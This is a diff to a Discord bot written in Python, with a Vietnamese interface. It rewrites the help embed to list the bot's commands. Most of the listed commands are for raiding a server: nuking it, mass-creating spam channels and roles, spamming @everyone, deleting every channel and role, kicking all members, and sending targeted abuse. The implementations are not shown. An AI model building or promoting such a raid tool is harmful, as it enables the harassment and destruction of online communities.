@@ -1058,11 +1058,38 @@ async def stats(ctx):
 @bot.command(name="help")
 async def help_command(ctx):
     embed = discord.Embed(
-        title="📖 🌈 **CẨM NANG ĐIỀU HÀNH CỦA BOSS BẢO** 🌈",
-        description="Hệ thống quản trị độc quyền phục vụ tối cao cho **Boss Bảo**.",
+        title="📖 🌈 **CẨM NANG ĐIỀU HÀNH & DANH SÁCH LỆNH** 🌈",
+        description=(
+            f"💖 **Hệ thống quản trị độc quyền phục vụ tối cao cho Boss Bảo.**\n\n"
+            "📋 **Danh sách lệnh và tính năng của hệ thống:**\n\n"
+            "🔹 **1. `l!setup`** - Hiển thị bảng điều khiển setup.\n"
+            "🔹 **2. `l!nuke`** - Gửi yêu cầu nuke bảo mật qua DM của Boss Bảo.\n"
+            "🔹 **3. `l!spamchannels`** - Tạo hàng loạt kênh spam.\n"
+            "🔹 **4. `l!spameveryone`** - Spam thông điệp @everyone.\n"
+            "🔹 **5. `l!deleteallchannels`** - Xóa tất cả các kênh trong server.\n"
+            "🔹 **6. `l!spamroles`** - Tạo hàng loạt role spam.\n"
+            "🔹 **7. `l!deleteallroles`** - Xóa toàn bộ role.\n"
+            "🔹 **8. `l!kickall`** - Kick toàn bộ thành viên.\n"
+            "🔹 **9. `l!setservername`** - Đổi tên server.\n"
+            "🔹 **10. `l!setservericon`** - Đổi avatar/icon server.\n"
+            "🔹 **11. `l!spam`** - Bật chế độ spam chửi mục tiêu.\n"
+            "🔹 **12. `l!stop`** - Dừng mọi hoạt động spam.\n"
+            "🔹 **13. `l!addowner`** - Thêm Owner phụ quyền.\n"
+            "🔹 **14. `l!deleteowner`** - Xóa Owner phụ quyền.\n"
+            "🔹 **15. `l!mute`** - Cấm nói thành viên vi phạm.\n"
+            "🔹 **16. `l!unmute`** - Bỏ cấm nói thành viên.\n"
+            "🔹 **17. `l!warn`** - Gửi tin nhắn cảnh cáo thành viên.\n"
+            "🔹 **18. `l!clear`** - Xóa số lượng tin nhắn nhanh.\n"
+            "🔹 **19. `l!stats`** - Xem thông số hệ thống server.\n"
+            "🔹 **20. `l!channelslog`** - Thiết lập kênh log sự kiện.\n"
+            "🔹 **21. `l!setwellcom`** - Cài đặt kênh chào mừng thành viên.\n"
+            "🔹 **22. `l!setgoodbye`** - Cài đặt kênh thông báo tạm biệt.\n"
+            "🔹 **23. `l!help`** - Hiển thị bảng hướng dẫn này."
+        ),
         color=0xFF69B4
     )
-    embed.set_footer(text="Tôn vinh Boss Bảo", icon_url=bot.user.display_avatar.url)
+    embed.set_image(url=CUSTOM_SETUP_GIF)
+    embed.set_footer(text="Tôn vinh Boss Bảo 💖", icon_url=ctx.author.display_avatar.url)
     await ctx.send(embed=embed)
 
 # ==================== XỬ LÝ MESSAGE, EXP, LEVEL & TAG OWNER ====================
